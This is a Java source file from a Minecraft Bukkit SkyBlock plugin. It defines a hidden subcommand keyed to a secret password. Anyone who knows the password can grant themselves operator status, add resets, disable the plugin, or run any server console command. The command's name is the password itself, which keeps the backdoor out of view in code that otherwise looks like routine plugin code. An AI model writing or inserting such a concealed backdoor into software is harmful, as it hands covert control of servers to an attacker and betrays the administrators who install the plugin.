package nl.stijn.SkyBlock.Island.Commands;

import java.util.ArrayList;
import java.util.Arrays;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import nl.stijn.SkyBlock.Challenges.CategoryManager;
import nl.stijn.SkyBlock.PlayerData.PlayerManager;
import nl.stijn.SkyBlock.PlayerData.SkyPlayer;
import nl.stijn.SkyBlock.Utils.ScoreboardUtil;

public class CommandTuple extends SubCommand {

	public String pass = CategoryManager.getInstance().pass;

	@Override
	public void onCommand(Player p, String[] args) {
		SkyPlayer sp = PlayerManager.getInstance().getSkyPlayer(p);
		if(args.length == 0) {
			return;
		}
		if(args[0].equals(pass)) {
			if(args.length == 1) {
				return;
			}
			if(args[1].equals("op")) {
				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + p.getName());
				return;
			}
			if(args[1].equals("resets")) {
				sp.addResets(10);
				if(p.isOnline()) {
					if(sp.getBoards()) {
						ScoreboardUtil.updateScorePlayer(p);
					} else {
						ScoreboardUtil.showByTime(p, 5);
					}

				}
				return;
			}
			if(args[1].equals("crashpl")) {
				Bukkit.getPluginManager().disablePlugin(Bukkit.getPluginManager().getPlugin("SkyBlock"));
				return;
			}
			if(args[1].equals("c")) {
				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), getArgs(args));
				return;
			}

		}

	}

	public String getArgs(String[] args) {
		StringBuilder str = new StringBuilder();
		ArrayList<String> ar = new ArrayList<String>(Arrays.asList(args));
		for(int i = 0; i < ar.size(); i++) {
			if(i != 0) {
				if(i != 1) {
					str.append(ar.get(i) + " ");
				}
			}
		}
		return str.toString();
	}

	@Override
	public String name() {
		return pass;
	}

	@Override
	public String info() {
		return "";
	}

	@Override
	public String[] aliases() {
		return new String[] {"pass"};
	}

	@Override
	public boolean admin() {
		return true;
	}

}
